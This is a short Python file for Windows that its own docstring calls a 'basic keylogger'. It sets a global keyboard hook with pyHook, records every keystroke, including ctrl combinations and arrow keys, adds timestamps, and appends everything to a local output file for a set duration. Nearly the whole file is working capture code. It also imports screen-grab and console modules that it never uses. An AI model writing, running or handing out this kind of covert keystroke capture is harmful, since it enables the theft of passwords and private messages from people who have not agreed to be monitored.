import win32api
import win32console
import win32gui
import pythoncom,pyHook
import sys
import time
from PIL import ImageGrab

lastTime = 0
shift = False
ctrl = False
startTime = time.time()
outFile = "output.txt"
"""
Basic keylogger
Writes to the output file specified above.
"""
def writeOut(data):
	fileName = outFile
	f=open(outFile,'a')
	f.write(data)
	f.close()

	
"""
Don't need to record the shift or ctrl key in the log,
only need to record the combination of the two. Thus shift + any 
letter will be recorded as a capitol letter.
"""
def onKeyUpEvent(event):
	global shift
	global ctrl
	ev = event.Key
	if(ev is not None):
		if "shift" in ev:
			shift = False
		elif "control" in ev:
			ctrl = False
			writeOut(" ")
	return True

def OnKeyDownEvent(event):
	global lastTime
	global shift
	global ctrl
	ev = event.Key
	if ev is None:
		return True
	if "control" in ev:
		ctrl = True
	if("shift" not in ev 
	and	"control" not in ev
	and "Capital" not in ev):
		asciiInt = int(event.Ascii)
		keylogs=chr(event.Ascii)
		if(abs(time.time()- lastTime) > 2*60*60):
			t = "\n\n"+ time.strftime("%H:%M:%S") + "\n"
			writeOut(t)
			lastTime = time.time()
		if "return" in ev:
			writeOut("\n")
		elif "Down" in ev:
			writeOut(" DownArrow ")
		elif "Up" in ev:
			writeOut(" UpArrow ")
		elif "Left" in ev:
			writeOut(" LeftArrow ")
		elif "Right" in ev:
			writeOut(" RightArrow ")
		elif ctrl:
			writeOut(" ctrl+" + chr(asciiInt + 96))
		else:
			writeOut(keylogs)
	return True
		
def runHook(dur, output):
	global outFile
	global startTime
	outFile = output
	hm=pyHook.HookManager()
	hm.KeyUp=onKeyUpEvent
	hm.KeyDown=OnKeyDownEvent
	# set the hook
	hm.HookKeyboard()
	# wait forever
	while time.time()-startTime < dur:
		pythoncom.PumpWaitingMessages()						

	startTime = time.time()